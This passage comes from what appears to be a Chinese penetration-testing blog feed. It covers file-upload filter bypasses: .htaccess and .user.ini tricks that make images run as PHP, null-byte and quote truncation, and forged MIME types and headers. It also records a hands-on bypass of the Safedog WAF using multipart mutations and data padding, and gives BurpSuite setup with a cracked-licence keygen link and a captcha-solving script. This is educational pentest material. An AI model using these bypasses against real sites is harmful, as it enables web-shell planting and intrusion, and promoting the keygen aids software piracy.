id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a><code>.htaccess</code></h5><p>前提条件：<code>Apache</code> 开启了 <code>rewrite</code> 模块</p><p>原理：在访问文件时，重写指定文件的扩展名</p><p>比如该 <code>.htaccess</code> 作用为在访问 <code>evil.gif</code> 时，让 <code>apache</code> 将其解析为 PHP 文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">IfModule</span> <span class="hljs-attr">mime_module</span>&gt;</span><br>AddHandler php5-script .gif         <br>SetHandler application/x-httpd-php    <br><span class="hljs-tag">&lt;/<span class="hljs-name">IfModule</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">FilesMatch</span> &quot;<span class="hljs-attr">evil.gif</span>&quot;&gt;</span><br>SetHandler application/x-httpd-php  <br>AddHandler php5-script .gif         <br><span class="hljs-tag">&lt;/<span class="hljs-name">FilesMatch</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">IfModule</span> <span class="hljs-attr">mime_module</span>&gt;</span><br>AddType application/x-httpd-php .gif<br><span class="hljs-tag">&lt;/<span class="hljs-name">IfModule</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a><code>.user.ini</code></h5><p><a href="https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html">user.ini 文件构成的 PHP 后门</a></p><p>其原理是可以通过 <code>.user.ini</code> 指定一个文件，让与 <code>.user.ini</code> 同目录下的 PHP 文件都自动包含该文件。</p><p>利用的话，上传 <code>.user.ini</code> 然后访问同目录下的一个 PHP 文件即可。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=<span class="hljs-number">1</span>.gif<br></code></pre></td></tr></table></figure><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><ul><li>00 截断</li><li>解析漏洞</li></ul><h5 id="00-截断"><a href="#00-截断" class="headerlink" title="00 截断"></a>00 截断</h5><p>原理：<code>00</code> 其实最后都被解析为 <code>chr(0)</code>，其代表一个空字符，当一个字符串中存在空字符时，在被解析的时候空字符后面的字符会被丢弃，导致绕过后面的合法后缀被丢弃。</p><p>利用：在要截断的地方加一个空格，如 <code>shell.php .png</code>，然后查看 Hex 编码，修改空格对应的 <code>20</code> 为 <code>00</code>。</p><h5 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h5><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051157073.png" alt="image-20230905115733008"></p><h3 id="内容过滤"><a href="#内容过滤" class="headerlink" title="内容过滤"></a>内容过滤</h3><ul><li>伪造 MIME</li><li>伪造文件头</li><li>绕过滤</li></ul><h5 id="伪造-MIME"><a href="#伪造-MIME" class="headerlink" title="伪造 MIME"></a>伪造 MIME</h5><p>这个 MIME 就是请求头的 <code>Content-Type</code> 字段，这里直接伪造即可：</p><ul><li><code>image/jpeg</code></li><li><code>image/png</code></li><li><code>image/apng</code></li><li><code>image/avif</code></li><li><code>image/gif</code></li><li><code>image/svg+xml</code></li><li><code>image/webp</code></li></ul><h5 id="伪造文件头"><a href="#伪造文件头" class="headerlink" title="伪造文件头"></a>伪造文件头</h5><p>文件头是 POST 数据的开头那里，<code>gif</code> 文件头都是可打印字符 <code>GIF89a</code>，其他的可以直接获取一个图片。</p><h5 id="绕过滤"><a href="#绕过滤" class="headerlink" title="绕过滤"></a>绕过滤</h5><p>这里的过滤其实就是后端有一个正则匹配，比如匹配 <code>php、eval</code> 字段，这个绕过其实就上传免杀马就行。 </p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>黑盒测试：</p><ul><li>找到文件上传处，手动测试绕过</li><li>看是否有 Nday，如第三方编辑器漏洞</li></ul><p>白盒测试：</p><ul><li>通过文件上传功能点，找代码看是否存在过滤</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>WEB漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BurpSuite</title>
    <link href="/2023/07/11/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/BurpSuite/"/>
    <url>/2023/07/11/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/BurpSuite/</url>
    
    <content type="html"><![CDATA[<h1 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li><p>BurpSuite：<a href="https://portswigger.net/Burp/Releases">https://portswigger.net/Burp/Releases</a></p></li><li><p>注册机：<a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases">https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases</a></p></li><li><p>jdk：<a href="https://www.oracle.com/java/technologies/downloads/#jdk17-windows">https://www.oracle.com/java/technologies/downloads/#jdk17-windows</a></p></li><li><p>ico：<a href="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/BurpSuite.ico">https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/BurpSuite.ico</a></p></li></ul><h2 id="Jython"><a href="#Jython" class="headerlink" title="Jython"></a>Jython</h2><p><a href="https://www.jython.org/download">https://www.jython.org/download</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230710180056079.png" alt="image-20230710180056079"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230710180345763.png" alt="image-20230710180345763"></p><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>辅助插件：</p><ul><li>HaE 高亮：<a href="https://github.com/gh0stkey/HaE/">https://github.com/gh0stkey/HaE/</a></li><li>BurpSuite_403Bypasser：<a href="https://github.com/sting8k/BurpSuite_403Bypasser">https://github.com/sting8k/BurpSuite_403Bypasser</a></li><li>验证码识别：<a href="https://github.com/f0ng/captcha-killer-modified">https://github.com/f0ng/captcha-killer-modified</a></li></ul><p>漏洞扫描：</p><ul><li>passive-scan-client：<a href="https://github.com/c0ny1/passive-scan-client">https://github.com/c0ny1/passive-scan-client</a></li><li>xia_sql：<a href="https://github.com/smxiazi/xia_sql">https://github.com/smxiazi/xia_sql</a></li><li>xia_Yue：<a href="https://github.com/smxiazi/xia_Yue/">https://github.com/smxiazi/xia_Yue/</a></li></ul><h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><h4 id="HaE"><a href="#HaE" class="headerlink" title="HaE"></a>HaE</h4><p>安装后需要在线更新规则：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230710180927718.png" alt="image-20230710180927718"></p><h4 id="captcha-killer-modified"><a href="#captcha-killer-modified" class="headerlink" title="captcha-killer-modified"></a>captcha-killer-modified</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># author:f0ngf0ng</span><br><br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> ddddocr                       <span class="hljs-comment"># 导入 ddddocr</span><br><span class="hljs-keyword">from</span> aiohttp <span class="hljs-keyword">import</span> web<br><br>parser = argparse.ArgumentParser()<br>parser.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;http port&quot;</span>,default=<span class="hljs-string">&quot;8888&quot;</span>)<br>args = parser.parse_args()<br><br>ocr = ddddocr.DdddOcr()<br>port = args.p<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_cb</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> web.Response(text=ocr.classification(img_base64=<span class="hljs-keyword">await</span> request.text()))<br><br>app = web.Application()<br>app.add_routes([<br>    web.post(<span class="hljs-string">&#x27;/reg&#x27;</span>, handle_cb),<br>])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    web.run_app(app, port=port)<br></code></pre></td></tr></table></figure><p>模版：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/reg</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8888<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>55<br><br><span class="language-typescript">&lt;<span class="hljs-meta">@BASE64</span>&gt;&lt;<span class="hljs-meta">@IMG_RAW</span>&gt;&lt;<span class="hljs-regexp">/@IMG_RAW&gt;&lt;/</span><span class="hljs-meta">@BASE64</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>安全工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>任意文件上传绕过</title>
    <link href="/2023/06/11/WAF%E7%BB%95%E8%BF%87/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"/>
    <url>/2023/06/11/WAF%E7%BB%95%E8%BF%87/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="任意文件上传绕过"><a href="#任意文件上传绕过" class="headerlink" title="任意文件上传绕过"></a>任意文件上传绕过</h1><h2 id="数据包解析"><a href="#数据包解析" class="headerlink" title="数据包解析"></a>数据包解析</h2><p>一个正常的文件上传数据包大致如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/upload/upload.html<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------163532972832098<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>327<br><br><span class="language-php">-----------------------------<span class="hljs-number">163532972832098</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;myfile&quot;</span>; filename=<span class="hljs-string">&quot;text.php&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br><span class="language-php">-----------------------------<span class="hljs-number">163532972832098</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">涓婁紶</span><br><span class="language-php">-----------------------------<span class="hljs-number">163532972832098</span>--</span><br></code></pre></td></tr></table></figure><p><code>Header</code>内容：</p><ul><li><code>Content-Type:multipart/form-data</code>：表示该请求为文件上传请求</li><li><code>boundary=---...98</code>：作用为分隔符，以区分POST数据</li></ul><p><code>POST数据</code>内容：</p><ul><li><code>Content-Disposition</code>：响应标头是指示内容是否预期在浏览器中内联显示的标题</li><li><code>name</code>：包含该字段的内容引用的 HTML 字段的名称</li><li><code>filename</code>：后面是一个包含传输文件的原始名称的字符串。</li><li>分隔符：在<code>boundary</code>前增加<code>--</code>，上传结束结尾增加<code>--</code></li></ul><p>可修改的内容：</p><ul><li><p>Content-Disposition：一般可更改</p></li><li><p>name：表单参数值，不能更改</p></li><li><p>filename：文件名，可以更改</p></li><li><p>Content-Type：文件 MIME，视情况更改</p></li><li><p>boundary：内容划分，可以更改</p></li></ul><h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="字符变异"><a href="#字符变异" class="headerlink" title="字符变异"></a>字符变异</h3><ul><li>引号变异  &#x3D;&gt;  单引号&#x2F;双引号&#x2F;单双引号&#x2F;无引号</li><li>参数名大小写变换  &#x3D;&gt;   <code>filename / name </code></li><li>分号重复  &#x3D;&gt;  <code>name=&quot;myfile&quot;;;;;;;;;filename=&quot;text.php&quot; </code></li><li>等号重复  &#x3D;&gt;  <code>filename===&quot;text.php&quot; </code></li></ul><h3 id="顺序变换"><a href="#顺序变换" class="headerlink" title="顺序变换"></a>顺序变换</h3><ul><li>交换 <code>name </code>和 <code>filename </code>的顺序</li><li>交换 <code>Content-Disposition </code>和 <code>Content-Type </code>的顺序</li><li>交换不同 <code>boundary </code>内容的顺序</li></ul><h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><h4 id="重复溢出"><a href="#重复溢出" class="headerlink" title="重复溢出"></a>重复溢出</h4><h6 id="数据重复"><a href="#数据重复" class="headerlink" title="数据重复"></a>数据重复</h6><p>POST数据包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/upload/upload.html<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------163532972832098<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>327<br><br><span class="language-php">-----------------------------<span class="hljs-number">163532972832098</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;myfile&quot;</span>; filename=<span class="hljs-string">&quot;text.php&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br><span class="language-php">-----------------------------<span class="hljs-number">163532972832098</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">涓婁紶</span><br><span class="language-php">-----------------------------<span class="hljs-number">163532972832098</span>--</span><br></code></pre></td></tr></table></figure><p>POST中可重复的数据：</p><ul><li><code>boundary </code></li><li>文件上传数据  &#x3D;&gt;  1 ~ 2 个换行符之间</li></ul><h6 id="数据包重复"><a href="#数据包重复" class="headerlink" title="数据包重复"></a>数据包重复</h6><p>在之前的SQL注入绕过中有一个  <code>phpline </code> 绕过，文件上传本质上还是POST数据包，跟POST注入是相同的，那么也就可以使用  <code>phpline </code> 重复数据包导致数据溢出。</p><h4 id="垃圾数据溢出"><a href="#垃圾数据溢出" class="headerlink" title="垃圾数据溢出"></a>垃圾数据溢出</h4><ul><li><code>name  </code>与  <code>filename </code> 之间插入大量垃圾数据</li><li><code>boundary </code> 字符串中加入垃圾数据</li><li><code>boundray </code> 末尾插入垃圾数据</li><li><code>multipart/form-data </code> 与  <code>boundary  </code>之间插入垃圾数据</li></ul><h3 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a>数据截断</h3><h5 id="换行截断"><a href="#换行截断" class="headerlink" title="换行截断"></a>换行截断</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>for<br>m-data; name=&quot;upload_<br>file&quot;; fi<br>le<br>name=&quot;tex<br>t<br>.<br>p<br>h<br>p&quot;<br></code></pre></td></tr></table></figure><h5 id="分号截断"><a href="#分号截断" class="headerlink" title="分号截断"></a>分号截断</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg;.php&quot;<br></code></pre></td></tr></table></figure><h5 id="引号截断"><a href="#引号截断" class="headerlink" title="引号截断"></a>引号截断</h5><p>php &lt; 5.3 单双引号截断特性。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg&#x27;.php&quot;<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg&quot;.php&quot;<br></code></pre></td></tr></table></figure><h5 id="00-截断"><a href="#00-截断" class="headerlink" title="00 截断"></a>00 截断</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php[0x00].jpg&quot;<br></code></pre></td></tr></table></figure><h2 id="Bypass-安全狗实战"><a href="#Bypass-安全狗实战" class="headerlink" title="Bypass 安全狗实战"></a>Bypass 安全狗实战</h2><p>测试环境：Apache2.4.39 + PHP7.3.4 + MySql5.7.26 + 网站安全狗(Apache版)4.0.32517</p><h4 id="1-数据溢出-phpline"><a href="#1-数据溢出-phpline" class="headerlink" title="1.数据溢出~phpline"></a>1.数据溢出~phpline</h4><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115852.png"></p><p>这里测试下最后以那个数据包的  <code>filename </code> 作为保存：</p><p>搞两个数据包，第一个  <code>filename </code> 是  <code>text.png </code>，第二个 是 <code>text.jpg </code>。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115959.png"></p><p>可以看出来，最后是 <code>text.jpg </code>，那么就不断复制数据包，把最后的 <code>filename </code>改成 <code>text.php </code>即可。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115969.png"></p><p>还是搞了200来行，成功绕过，数据包不能搞太多，太多直接报错，一般200~400行就OK。</p><h4 id="2-数据溢出-boundary重复"><a href="#2-数据溢出-boundary重复" class="headerlink" title="2.数据溢出~boundary重复"></a>2.数据溢出~boundary重复</h4><p> <code>boundary </code>，文件上传数据包中的分隔符。</p><p>这里搞到210行后才绕过。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115978.png"></p><h4 id="3-数据溢出-POST数据重复"><a href="#3-数据溢出-POST数据重复" class="headerlink" title="3.数据溢出~POST数据重复"></a>3.数据溢出~POST数据重复</h4><p>看下POST数据：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http">------WebKitFormBoundaryZvfnCEkBjLsBSJ6e<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;myfile&quot;; filename=&quot;text.php&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream<br><br>&lt;?php phpinfo();?&gt;<br>------WebKitFormBoundaryZvfnCEkBjLsBSJ6e<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;submit&quot;<br><br>涓婁紶<br>------WebKitFormBoundaryZvfnCEkBjLsBSJ6e--<br></code></pre></td></tr></table></figure><p>测试文件名，内容数据包重复看能否上传：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http">------WebKitFormBoundaryZvfnCEkBjLsBSJ6e<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;myfile&quot;; filename=&quot;text.jpg&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream<br><br>&lt;?php phpinfo();?&gt;<br>------WebKitFormBoundaryZvfnCEkBjLsBSJ6e<br>------WebKitFormBoundaryZvfnCEkBjLsBSJ6e<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;myfile&quot;; filename=&quot;text.png&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream<br><br>&lt;?php phpinfo();?&gt;<br>------WebKitFormBoundaryZvfnCEkBjLsBSJ6e<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;submit&quot;<br><br>涓婁紶<br>------WebKitFormBoundaryZvfnCEkBjLsBSJ6e--<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115989.png"></p><p>OK，能重复，文件命名以第二个为准。</p><p>然后重复呗，但是这次出错了，文件加载出来是 <code>text.png </code>：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115996.png"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115381.png"></p><p>哪里来的 <code>text.png </code>呢？</p><p>前面重复的数据呗，那么试试把前面的 <code>filename </code>去掉，只保留最后的：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115390.png"></p><p>这次还是没问题，试试：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115396.png"></p><p>没问题啦，270行以后就OK </p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>WAF绕过</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WAF绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 环境配置</title>
    <link href="/2023/06/09/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Go%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2023/06/09/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Go%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="Go-环境配置"><a href="#Go-环境配置" class="headerlink" title="Go 环境配置"></a>Go 环境配置</h1><p><a href="https://studygolang.com/dl">https://studygolang.com/dl</a></p><h2 id="Linux-安装-Go"><a href="#Linux-安装-Go" class="headerlink" title="Linux 安装 Go"></a>Linux 安装 Go</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 下载 go 源码</span><br>wget https:<span class="hljs-regexp">//</span>studygolang.com<span class="hljs-regexp">/dl/g</span>olang/go1.<span class="hljs-number">20.4</span>.linux-amd64.tar.gz<br><span class="hljs-comment"># 解压到 /usr/local</span><br>tar -C <span class="hljs-regexp">/usr/</span>local -xzf go1.<span class="hljs-number">20.4</span>.linux-amd64.tar.gz<br><span class="hljs-comment"># 添加环境变量</span><br>echo <span class="hljs-string">&quot;export PATH=$PATH:/usr/local/go/bin&quot;</span> &gt;&gt;  <span class="hljs-regexp">/etc/</span>profile<br><span class="hljs-comment"># 添加 $GOPATH/bin 到环境变量, 用于 go install 工具的运行, go env 查看 $GOPATH</span><br>echo <span class="hljs-string">&quot;export PATH=$PATH:/root/go/bin&quot;</span>  &gt;&gt;  <span class="hljs-regexp">/etc/</span>profile<br><span class="hljs-comment"># 刷新配置</span><br>source <span class="hljs-regexp">/etc/</span>profile<br></code></pre></td></tr></table></figure><h2 id="国内代理"><a href="#国内代理" class="headerlink" 